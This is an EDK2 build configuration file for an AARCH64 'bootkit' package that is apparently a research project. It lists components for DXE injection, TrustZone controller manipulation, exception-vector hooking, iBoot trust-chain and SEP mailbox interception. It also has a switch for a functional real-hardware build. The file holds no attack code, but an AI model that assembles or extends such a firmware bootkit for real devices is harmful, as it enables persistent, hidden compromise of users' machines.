## @file
#  Barzakh Bootkit Package - AARCH64 Platform
#
#  Copyright (c) 2026, Barzakh Research Project
#  SPDX-License-Identifier: BSD-2-Clause-Patent
#
##

[Defines]
  PLATFORM_NAME                  = BootkitPkg
  PLATFORM_GUID                  = 12345678-AAAA-BBBB-CCCC-AA6C64010201
  PLATFORM_VERSION               = 2.0
  DSC_SPECIFICATION              = 0x00010005
  OUTPUT_DIRECTORY               = Build/BootkitPkgAarch64
  SUPPORTED_ARCHITECTURES        = AARCH64
  BUILD_TARGETS                  = DEBUG|RELEASE
  SKUID_IDENTIFIER               = DEFAULT

[LibraryClasses]
  UefiDriverEntryPoint|MdePkg/Library/UefiDriverEntryPoint/UefiDriverEntryPoint.inf
  UefiBootServicesTableLib|MdePkg/Library/UefiBootServicesTableLib/UefiBootServicesTableLib.inf
  UefiRuntimeServicesTableLib|MdePkg/Library/UefiRuntimeServicesTableLib/UefiRuntimeServicesTableLib.inf
  UefiLib|MdePkg/Library/UefiLib/UefiLib.inf
  BaseLib|MdePkg/Library/BaseLib/BaseLib.inf
  BaseMemoryLib|MdePkg/Library/BaseMemoryLib/BaseMemoryLib.inf
  MemoryAllocationLib|MdePkg/Library/UefiMemoryAllocationLib/UefiMemoryAllocationLib.inf
  DebugLib|MdePkg/Library/BaseDebugLibNull/BaseDebugLibNull.inf
  PrintLib|MdePkg/Library/BasePrintLib/BasePrintLib.inf
  TimerLib|MdePkg/Library/BaseTimerLibNullTemplate/BaseTimerLibNullTemplate.inf
  PcdLib|MdePkg/Library/BasePcdLibNull/BasePcdLibNull.inf
  DevicePathLib|MdePkg/Library/UefiDevicePathLib/UefiDevicePathLib.inf
  RegisterFilterLib|MdePkg/Library/RegisterFilterLibNull/RegisterFilterLibNull.inf

[Components]
  BootkitPkg/Aarch64/Aarch64DxeInject.inf
  BootkitPkg/Aarch64/El3SecureMonitor/El3SecureMonitor.inf
  BootkitPkg/Aarch64/TzascManipulation/TzascManipulation.inf
  BootkitPkg/Aarch64/ExceptionVectorHook/ExceptionVectorHook.inf
  BootkitPkg/Aarch64/DeviceTreeInject/DeviceTreeInject.inf
  BootkitPkg/Aarch64/IbootTrustChain/IbootTrustChain.inf
  BootkitPkg/Aarch64/SepMailboxIntercept/SepMailboxIntercept.inf
  BootkitPkg/Aarch64/NvidiaTegraInject/NvidiaTegraInject.inf
  BootkitPkg/Aarch64/NspCommandForge/NspCommandForge.inf

[BuildOptions]
  GCC:*_*_AARCH64_CC_FLAGS = -DBARZAKH_RESEARCH=1 -I$(WORKSPACE)/BootkitPkg/Include -Wall -Wno-unused-parameter -Werror=implicit-function-declaration -fno-stack-protector
  #
  # Functional (real-hardware) lab build — see Include/BarzakhMode.h.
  # Simulation is the default; pass -D BARZAKH_FUNCTIONAL=1 on the build
  # command line for a functional lab build — never for published artifacts.
  #
!ifdef BARZAKH_FUNCTIONAL
  GCC:*_*_AARCH64_CC_FLAGS = -DBARZAKH_FUNCTIONAL=1
!endif
